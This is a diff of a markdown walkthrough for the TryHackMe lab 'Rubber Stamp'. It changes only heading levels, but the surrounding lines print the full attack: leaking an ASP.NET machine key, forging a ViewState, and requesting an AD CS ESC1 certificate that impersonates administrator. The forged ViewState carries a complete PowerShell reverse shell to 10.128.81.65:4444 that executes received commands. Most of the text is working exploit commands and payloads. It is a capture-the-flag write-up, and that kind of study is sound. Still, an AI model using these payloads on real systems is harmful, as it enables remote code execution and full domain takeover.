@@ -1,7 +1,7 @@
 # Tryhackme room Rubber Stamp https://tryhackme.com/room/rubberstamp
 # Youtube video walk through: https://youtu.be/d7N3ouYnJQY
 
-# Machine key leak (via global.asax.bak dispatch):
+## Machine key leak (via global.asax.bak dispatch):
  
 ```
 curl -s "http://10.128.183.112/legacy/RequestStatus.aspx?id=none&debug=true"
@@ -16,7 +16,7 @@ curl -sS -i -X POST \
   --data-urlencode '__VIEWSTATEGENERATOR=0CA456E0'
 ```
 
-# shell
+## shell
 ```
 python3 build_vs.py -ps \
 '$c=New-Object Net.Sockets.TCPClient("10.128.81.65",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
@@ -28,9 +28,9 @@ curl -sS -i -X POST \
   --data-urlencode '__VIEWSTATE@forged_vs.b64' \
   --data-urlencode '__VIEWSTATEGENERATOR=0CA456E0'
 ```
-# cert
+## cert
 
-# Create esc1.cnf:
+## Create esc1.cnf:
 ```
 [req]
 distinguished_name=dn
@@ -48,7 +48,7 @@ otherName.1=1.3.6.1.4.1.311.20.2.3;UTF8:administrator@rubberstamp.local
 DNS.1=administrator.rubberstamp.local
 ```
 
-# Generate:
+## Generate:
 
 ```
 openssl req -new -newkey rsa:2048 -nodes \
@@ -77,7 +77,7 @@ $req = [regex]::Match($requestData.Content, 'ReqID=(\d+)').Groups[1].Value
 $req
 ```
 
-# And retrieve the certificate:
+## And retrieve the certificate:
 
 ```
 Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri "http://SRV01.rubberstamp.local/certsrv/certnew.cer?ReqID=$req&Enc=b64" -OutFile C:\badr\admin_cert.pem -TimeoutSec 20
@@ -86,7 +86,7 @@ Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri "http://SRV01.rub
 Get-Content -Raw C:\badr\admin_cert.pem
 ```
 
-# admin_cert.pem
+## admin_cert.pem
 
 ```
 openssl pkcs12 -export \
